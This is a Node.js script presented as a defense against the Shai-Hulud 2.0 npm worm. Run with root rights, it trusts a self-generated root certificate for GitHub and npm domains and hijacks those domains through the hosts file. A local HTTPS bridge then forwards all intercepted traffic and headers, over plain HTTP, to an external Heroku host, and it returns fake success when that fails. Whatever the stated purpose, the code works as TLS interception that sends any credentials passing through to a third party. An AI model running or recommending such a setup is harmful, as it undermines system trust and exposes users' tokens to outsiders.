// Free and open source for non commercial open source use with attribution
// Author: Erez Kalman
//
// Prerequisites
// 1. Node.js must be installed on the victim machine.
// 2. The script must be run with Administrator/Root privileges (to update the Trust Store and Hosts file).
// 3. No npm install is required for the local machine (the script uses native Node.js modules).

/**
 * Shai-Hulud 2.0 Defense - Self-Generating Bridge (Node.js)
 * * 1. Generates a self-signed CA valid for: api.github.com, registry.npmjs.org, raw.githubusercontent.com
 * 2. Trusts the CA in the OS store.
 * 3. Hijacks DNS via /etc/hosts.
 * 4. Starts a local HTTPS bridge to tunnel traffic to Heroku.
 * * USAGE:
 * Linux/Mac: sudo node setup_bridge_generator.js
 * Windows:   Run as Administrator: node setup_bridge_generator.js
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn, execSync } = require('child_process');
const https = require('https');
const http = require('http');

// --- CONFIGURATION ---
const HEROKU_APP_URL = 'shai-hulud-2-0-dms-sh-bd640bc05c42.herokuapp.com'; // <--- VERIFY THIS
const LOCAL_IP = '127.0.0.1';
const DOMAINS = ['api.github.com', 'registry.npmjs.org', 'raw.githubusercontent.com'];
const CERT_NAME = 'shai-hulud-defense.crt';
const KEY_NAME = 'shai-hulud-defense.key';

const PLATFORM = os.platform();
const IS_WINDOWS = PLATFORM === 'win32';

// --- BRIDGE SERVER LOGIC ---
function startBridge() {
    console.log('[4/4] Starting Bridge Server (HTTPS:443)...');
    
    const sslOptions = {
        key: fs.readFileSync(KEY_NAME),
        cert: fs.readFileSync(CERT_NAME),
    };

    const proxyHandler = (req, res) => {
        console.log(`[BRIDGE] Tunneling: ${req.headers.host}${req.url} -> ${HEROKU_APP_URL}`);

        const options = {
            hostname: HEROKU_APP_URL,
            port: 80, // Standard HTTP to Heroku (Heroku handles upgrade to HTTPS internally if needed)
            path: req.url,
            method: req.method,
            headers: {
                ...req.headers,
                host: HEROKU_APP_URL // Rewrite Host header
            }
        };

        const proxyReq = http.request(options, (proxyRes) => {
            res.writeHead(proxyRes.statusCode, proxyRes.headers);
            proxyRes.pipe(res, { end: true });
        });

        proxyReq.on('error', (e) => {
            console.error(`[ERROR] Tunnel failed: ${e.message}`);
            // Failsafe: Return 200 OK to keep malware happy
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true })); 
        });

        req.pipe(proxyReq, { end: true });
    };

    try {
        https.createServer(sslOptions, proxyHandler).listen(443, LOCAL_IP, () => {
            console.log('--- BRIDGE ACTIVE ---');
            console.log(`Redirecting captured traffic to ${HEROKU_APP_URL}`);
            console.log('Do NOT close this window.');
        });
    } catch (e) {
        console.error(`[FATAL] Could not bind port 443. Are you running as Admin/Root? Error: ${e.message}`);
        process.exit(1);
    }
}

// --- STEP 1: GENERATE CERTIFICATES ---
function generateCert() {
    console.log('[1/4] Generating Self-Signed Certificate (SAN)...');
    
    // OpenSSL Config for SAN (Subject Alternative Name)
    const cnf = `
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
[req_distinguished_name]
C = US
ST = Defense
L = Sinkhole
O = ShaiHuludShield
CN = api.github.com
[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names
[alt_names]
DNS.1 = api.github.com
DNS.2 = registry.npmjs.org
DNS.3 = raw.githubusercontent.com
`;
    fs.writeFileSync('openssl_san.cnf', cnf);

    try {
        // Generate Key and Cert
        execSync(`openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ${KEY_NAME} -out ${CERT_NAME} -config openssl_san.cnf -extensions v3_req`, { stdio: 'ignore' });
        console.log('      Success.');
        fs.unlinkSync('openssl_san.cnf'); // Cleanup
    } catch (e) {
        console.error('[ERROR] OpenSSL failed. Is it installed and in your PATH?');
        console.error('        Windows users: Install Git Bash or OpenSSL for Windows.');
        process.exit(1);
    }
}

// --- STEP 2: TRUST CERTIFICATE ---
function trustCert() {
    console.log('[2/4] Adding Certificate to System Trust Store...');
    const certPath = path.resolve(CERT_NAME);

    try {
        if (PLATFORM === 'darwin') { // MacOS
            execSync(`sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain "${certPath}"`);
        } else if (PLATFORM === 'linux') { // Linux
            if (fs.existsSync('/usr/local/share/ca-certificates/')) {
                execSync(`sudo cp "${certPath}" /usr/local/share/ca-certificates/shai-hulud.crt`);
                execSync(`sudo update-ca-certificates`);
            } else if (fs.existsSync('/etc/pki/ca-trust/source/anchors/')) {
                execSync(`sudo cp "${certPath}" /etc/pki/ca-trust/source/anchors/shai-hulud.crt`);
                execSync(`sudo update-ca-trust`);
            } else {
                console.log('      [WARNING] Could not detect Linux distro trust store. Manual trust required.');
            }
        } else if (IS_WINDOWS) { // Windows
            execSync(`powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList 'Import-Certificate -FilePath ''${certPath}'' -CertStoreLocation Cert:\\LocalMachine\\Root'"` );
        }
        console.log('      Certificate trusted.');
    } catch (e) {
        console.error(`      [ERROR] Failed to trust certificate: ${e.message}`);
        console.log('      Ensure you are running as Administrator/Sudo.');
        process.exit(1);
    }
}

// --- STEP 3: UPDATE HOSTS ---
function updateHosts() {
    console.log('[3/4] Hijacking DNS in Hosts file...');
    
    const hostsPath = IS_WINDOWS ? 'C:\\Windows\\System32\\drivers\\etc\\hosts' : '/etc/hosts';
    let entry = `\n# SHAI-HULUD DEFENSE\n`;
    DOMAINS.forEach(d => { entry += `${LOCAL_IP} ${d}\n`; });

    try {
        const content = fs.readFileSync(hostsPath, 'utf8');
        if (!content.includes('SHAI-HULUD DEFENSE')) {
            fs.appendFileSync(hostsPath, entry);
            console.log('      Hosts file updated.');
        } else {
            console.log('      Hosts file already protected.');
        }
    } catch (e) {
        console.error(`      [ERROR] Cannot write to hosts file: ${e.message}`);
        process.exit(1);
    }
}

// --- MAIN ---
(function run() {
    generateCert();
    trustCert();
    updateHosts();
    startBridge();
})();
